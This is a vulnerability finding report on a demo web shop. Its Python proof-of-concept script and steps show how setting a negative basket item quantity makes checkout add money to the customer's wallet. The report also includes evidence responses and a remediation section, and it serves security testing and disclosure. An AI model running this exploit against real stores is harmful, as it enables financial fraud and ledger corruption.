# Negative basket item quantity enables negative-total orders and wallet credit generation

**ID:** vuln-0016
**Severity:** MEDIUM
**Found:** 2026-09-11 20:01:15 UTC
**Target:** http://host.docker.internal:3001
**Method:** PUT
**CVSS:** 6.5
**Confidence:** High
**Fix Effort:** Low

## Description

The basket item quantity endpoint PUT /api/BasketItems/:id accepts negative quantities, producing negative basket totals. Checkout then processes the negative-total order, crediting the paying wallet instead of debiting it — a repeatable money-printing primitive for any authenticated customer.

## Evidence

Stored negative quantity and its effect on the order and wallet:

```json
{"status":"success","data":{"ProductId":1,"BasketId":6,"id":14,"quantity":-5,"createdAt":"2026-09-11T19:56:14.127Z","updatedAt":"2026-09-11T19:56:46.990Z"}}
```

Checkout response: `{"orderConfirmation":"1531-5406d4277e1a060d"}` and the tracked order:

```json
{"orderId":"1531-5406d4277e1a060d","totalPrice":-19.9,"products":[{"quantity":-10,"id":1,"name":"Apple Juice (1000ml)","price":1.99,"total":-19.9}],"bonus":0}
```

Wallet moved from 4951 to 4970.90 after the negative-total wallet checkout — a gain of +19.90 for "buying" 10 negative juices.

## Impact

Any authenticated customer can create orders with arbitrary negative totals and, by paying with the wallet, permanently increase their wallet balance by the negated amount — infinitely repeatable. The order history stores negative-priced orders and negative quantities, corrupting accounting records. In a real store this is direct financial fraud: unlimited store credit generation and unbounded ledger corruption.

## Counterevidence

Checked for guards on the quantity path: the UI clamps quantity to >=1 client-side (JS `s<1?1:s` in the Angular bundle), but the server-side PUT /api/BasketItems/:id performs no server-side re-validation — the negative value is stored and propagated into the order record. Warehouse inventory PUT /api/Quantitys IS protected (403 "Malicious activity detected"), confirming the app has a server-side tamper guard pattern for quantities but it is not applied to basket items. No WAF or request validation rejected the payloads.

## What Would Change This Severity

If checkout additionally failed to re-validate inventory deduction for negative quantities in a production deployment (e.g. corrupting shared stock records), availability impact would raise this to high.

## Technical Analysis

PUT /api/BasketItems/:id updates the basket item quantity without validating that it is a positive integer. The Angular UI clamps quantities client-side (`quantity < 1 ? 1 : quantity`), but the REST endpoint stores any integer, including negatives. The basket total is computed as price × quantity, so a quantity of -10 yields a total of -19.90. The checkout handler POST /rest/basket/:id/checkout accepts this negative total without re-validation, creates the order, and when paymentId is "wallet" applies the standard wallet deduction of the (negative) amount — i.e. it adds funds to the wallet. The stored order (GET /rest/track-order/:orderId) confirms totalPrice: -19.9 and quantity: -10, demonstrating durable state corruption of the order ledger and the wallet.

## Proof of Concept

1. Authenticate as any registered customer and add a product to your basket via POST /api/BasketItems.
2. PUT /api/BasketItems/{id} with {"quantity": -10} — the server stores the negative quantity (200).
3. GET /rest/basket/{bid} shows a negative basket total (-19.90).
4. Record wallet balance via GET /rest/wallet/balance.
5. POST /rest/basket/{bid}/checkout with {"couponData": null, "orderDetails": {"paymentId": "wallet", "addressId": <yours>, "deliveryMethodId": <id>}}.
6. Re-read the wallet: it has INCREASED by the negated total. The order record confirms totalPrice: -19.9 with quantity -10.

```python
import json
import requests

BASE = "http://host.docker.internal:3001"
TOKEN = open("/workspace/recon_token.txt").read().strip()  # any customer JWT
H = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
P = {"http": None, "https": None}
BID = 6  # own basket id (from JWT "bid" claim)
ADDRESS_ID = 10  # any address created via POST /api/Addresss

def wallet():
    return requests.get(f"{BASE}/rest/wallet/balance", headers=H, proxies=P).json()["data"]

before = wallet()
r = requests.post(f"{BASE}/api/BasketItems", headers=H,
                  data=json.dumps({"ProductId": 1, "BasketId": BID, "quantity": 1}), proxies=P)
item_id = r.json()["data"]["id"]
requests.put(f"{BASE}/api/BasketItems/{item_id}", headers=H,
             data=json.dumps({"quantity": -10}), proxies=P)
r = requests.get(f"{BASE}/rest/basket/{BID}", headers=H, proxies=P)
total = sum(p["price"] * p["BasketItem"]["quantity"] for p in r.json()["data"]["Products"])
print("negative basket total:", total)

r = requests.post(f"{BASE}/rest/basket/{BID}/checkout", headers=H,
                  data=json.dumps({"couponData": None, "orderDetails": {
                      "paymentId": "wallet", "addressId": ADDRESS_ID, "deliveryMethodId": 3}}), proxies=P)
confirmation = r.json().get("orderConfirmation")
after = wallet()
print("order:", confirmation)
print("wallet:", before, "->", after, f"(delta {after - before:+.2f})")
r = requests.get(f"{BASE}/rest/track-order/{confirmation}", headers=H, proxies=P)
d = r.json()["data"][0]
print("recorded order totalPrice:", d["totalPrice"], "quantity:", d["products"][0]["quantity"])
```

## Remediation

Enforce a positive-integer minimum (>= 1) on basket item quantity on the server at PUT /api/BasketItems/:id and at POST /api/BasketItems, using the same server-side tamper guard already applied to warehouse quantities (PUT /api/Quantitys/:id). Recompute and validate the order total server-side at checkout, rejecting any order whose total is not a positive number before any payment or wallet mutation is applied.

## Assumptions

Authenticated customer account; demo application with seeded data, so impact is scored on the demonstrated consequence class (monetary integrity violation), not real-user harm.
